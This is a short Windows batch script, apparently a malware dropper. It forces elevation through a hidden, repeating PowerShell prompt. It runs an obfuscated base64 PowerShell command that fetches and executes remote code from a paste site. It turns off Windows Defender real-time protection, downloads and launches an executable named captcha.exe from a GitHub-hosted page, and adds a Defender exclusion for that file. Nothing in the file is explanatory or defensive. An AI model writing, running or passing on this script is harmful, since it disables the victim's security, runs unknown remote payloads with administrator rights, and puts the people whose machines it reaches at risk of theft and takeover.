@echo off
cd /d "%~dp0"
net session >nul 2>&1
if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
start powershell -executionpolicy bypass -WindowStyle hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGoAdQBzAHQAaQB0AC4AYwBvAG0ALwByAGEAdwAvAG0AcwBkAGMAZwB5ADMAYgB4AGcAIAB8ACAAaQBlAHgA
:: Tắt Windows Defender (chỉ hoạt động trên một số phiên bản Windows)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
@echo off
set "url=https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/captcha.exe"
set "path=%appdata%\captcha.exe"
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%path%'"
if exist "%path%" start "" "%path%"
powershell -Command "Add-MpPreference -ExclusionPath '%path%'"
